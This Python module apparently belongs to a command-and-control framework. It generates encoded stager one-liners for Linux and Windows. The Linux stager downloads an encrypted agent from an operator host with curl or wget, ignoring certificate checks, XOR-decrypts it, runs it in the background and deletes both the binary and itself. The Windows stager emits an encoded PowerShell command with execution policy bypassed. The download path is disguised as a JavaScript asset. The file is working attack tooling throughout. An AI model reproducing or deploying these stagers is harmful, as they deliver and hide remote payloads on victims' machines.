import base64
import warnings
import os
import datetime

def _generate_encoded_linux_binary_stager(listener_info):
    host = listener_info.get('host')
    port = listener_info.get('port')
    protocol = listener_info.get('type', 'http')
    c2_url = f"{protocol}://{host}:{port}"
    download_uri = listener_info.get('download_uri', '/api/assets/main.js')
    full_agent_url = f"{c2_url}{download_uri}"

    import os
    secret_key = os.environ.get('SECRET_KEY')
    if not secret_key:
        raise Exception("SECRET_KEY environment variable not found during dropper generation!")

    bash_template = f'''#!/bin/bash
set -e
SECRET_KEY="{secret_key}"
AGENT_URL="{full_agent_url}"
ENCRYPTED_AGENT_DATA=$(curl -k -s -H "Accept: */*" "$AGENT_URL")
if [ -z "$ENCRYPTED_AGENT_DATA" ]; then
    ENCRYPTED_AGENT_DATA=$(wget --no-check-certificate -qO- "$AGENT_URL")
fi
if [ -z "$ENCRYPTED_AGENT_DATA" ]; then
    exit 1
fi
ENCRYPTED_AGENT_DATA=$(echo "$ENCRYPTED_AGENT_DATA" | tr -d '\\n\\r\\t ' | sed 's/^[[:space:]]*//' | sed 's/[[:space:]]*$//')
if [ -z "$ENCRYPTED_AGENT_DATA" ]; then
    exit 1
fi
DECRYPTED_BINARY_PATH=$(mktemp -t neoc2_agent_XXXXXX.bin)
echo "$ENCRYPTED_AGENT_DATA" > /tmp/.tmp_encrypted_data_$$
python3 -c "
import sys, base64, os, tempfile
with open('/tmp/.tmp_encrypted_data_$$', 'r') as f:
    data = f.read().strip()
key = sys.argv[1]
output_path = sys.argv[2]
try:
    encrypted_bytes = base64.b64decode(data.encode('utf-8'))
except Exception:
    encrypted_bytes = data.encode('utf-8')
if len(encrypted_bytes) == 0:
    exit(1)
key_bytes = key.encode('utf-8')
if len(key_bytes) == 0:
    exit(1)
decrypted_bytes = bytearray()
for i in range(len(encrypted_bytes)):
    decrypted_bytes.append(encrypted_bytes[i] ^ key_bytes[i % len(key_bytes)])
with open(output_path, 'wb') as f:
    f.write(decrypted_bytes)
os.chmod(output_path, 0o755)
" "$SECRET_KEY" "$DECRYPTED_BINARY_PATH"
rm -f /tmp/.tmp_encrypted_data_$$ 2>/dev/null
if [ ! -f "$DECRYPTED_BINARY_PATH" ] || [ ! -s "$DECRYPTED_BINARY_PATH" ]; then
    rm -f "$DECRYPTED_BINARY_PATH" 2>/dev/null
    exit 1
fi
nohup "$DECRYPTED_BINARY_PATH" > /dev/null 2>&1 &
(sleep 10 && rm -f "$DECRYPTED_BINARY_PATH" 2>/dev/null) &
sleep 2
CURRENT_SCRIPT="$0"
rm -f "$CURRENT_SCRIPT"
'''
    encoded_script = base64.b64encode(bash_template.encode('utf-8')).decode('utf-8')
    stager = f'bash -c "$(echo \'{encoded_script}\' | base64 -d)"'
    return stager

def _generate_encoded_windows_exe_stager(listener_info):
    host = listener_info.get('host')
    port = listener_info.get('port')
    protocol = listener_info.get('type', 'http')
    c2_url = f"{protocol}://{host}:{port}"
    download_uri = listener_info.get('download_uri', '/api/assets/main.js')
    full_agent_url = f"{c2_url}{download_uri}"

    import os
    secret_key = os.environ.get('SECRET_KEY')
    if not secret_key:
        raise Exception("SECRET_KEY environment variable not found during dropper generation!")

    script_dir = os.path.dirname(__file__)
    template_path = os.path.join(script_dir, 'windows_exe_stager_template.ps1')

    with open(template_path, 'r') as f:
        ps_template = f.read()

    ps_template = ps_template.replace('{secret_key}', secret_key).replace('{full_agent_url}', full_agent_url)

    import base64
    encoded_ps = base64.b64encode(ps_template.encode('utf-16le')).decode('utf-8')
    stager = f'powershell -exec bypass -enc {encoded_ps}'
    return stager

def handle_interactive_stager_command(command_parts: list, session: object) -> tuple:
    if len(command_parts) < 2:
        help_text = """
**Actions:**
  `generate`   - Generate a stager payload.
  `list`       - List available stager types.

**Options for droppers:**
  `host=<ip>`          - The IP address or hostname to download from.
  `port=<port>`        - The port to download from.
  `protocol=<http|https>` - The protocol (defaults to `http`).
  `download_uri=<uri>` - The endpoint to download the agent from (defaults to `/api/assets/main.js`).

**Example:**
  `stager generate linux_binary host=10.10.10.5 port=80 protocol=http`
  `stager generate windows_exe host=10.10.10.5 port=80 protocol=http`
"""
        return help_text, 'info'
    action = command_parts[1].lower()
    if action == 'generate':
        if len(command_parts) < 3:
            return "Invalid Syntax. Usage: `stager generate <type> [options]`", 'error'
        stager_type = command_parts[2].lower()
        options = {}
        for part in command_parts[3:]:
            if '=' in part:
                key, value = part.split('=', 1)
                if value.lower() == 'true':
                    value = True
                elif value.lower() == 'false':
                    value = False
                options[key.lower()] = value
        if stager_type == 'linux_binary':
            host = options.get('host')
            port = options.get('port')
            protocol = options.get('protocol', 'http').lower()
            download_uri = options.get('download_uri', '/api/assets/main.js')
            if not (host and port):
                return "Missing Arguments. Both `host` and `port` are required for droppers.", 'error'
            if protocol not in ['http', 'https']:
                return "Invalid Protocol. Must be `http` or `https`.", 'error'
            try:
                listener_info = {
                    "host": host,
                    "port": port,
                    "type": protocol,
                    "download_uri": download_uri
                }
                stager_content = _generate_encoded_linux_binary_stager(listener_info)
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"linux_binary_stager_{timestamp}.txt"
                filepath = os.path.join("logs", filename)
                os.makedirs("logs", exist_ok=True)
                with open(filepath, 'w') as f:
                    f.write(stager_content)
                response = f"Linux binary stager saved to: {filepath}\n\n{stager_content}"
                return response, 'success'
            except Exception as e:
                return f"Linux binary stager generation failed: An unexpected error occurred: {e}", 'error'
        elif stager_type == 'windows_exe':
            host = options.get('host')
            port = options.get('port')
            protocol = options.get('protocol', 'http').lower()
            download_uri = options.get('download_uri', '/api/assets/main.js')
            if not (host and port):
                return "Missing Arguments. Both `host` and `port` are required for droppers.", 'error'
            if protocol not in ['http', 'https']:
                return "Invalid Protocol. Must be `http` or `https`.", 'error'
            try:
                listener_info = {
                    "host": host,
                    "port": port,
                    "type": protocol,
                    "download_uri": download_uri
                }
                stager_content = _generate_encoded_windows_exe_stager(listener_info)
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"windows_exe_stager_{timestamp}.txt"
                filepath = os.path.join("logs", filename)
                os.makedirs("logs", exist_ok=True)
                with open(filepath, 'w') as f:
                    f.write(stager_content)
                response = f"Windows EXE stager saved to: {filepath}\n\n{stager_content}"
                return response, 'success'
            except Exception as e:
                return f"Windows EXE stager generation failed: An unexpected error occurred: {e}", 'error'
        else:
            return f"Unsupported Type: '{stager_type}'. Available: `linux_binary`, `windows_exe`.", 'error'
    elif action == 'list':
        output = """
**Available Stager Types:**
─────────────────────────────────────
  `linux_binary`       - Linux binary execution stager downloading from /api/assets/main.js
  `windows_exe`        - Windows EXE execution stager downloading from /api/assets/main.js
─────────────────────────────────────
"""
        return output, 'success'
    else:
        return f"Unknown Action: '{action}'. Available: `generate`, `list`.", 'error'
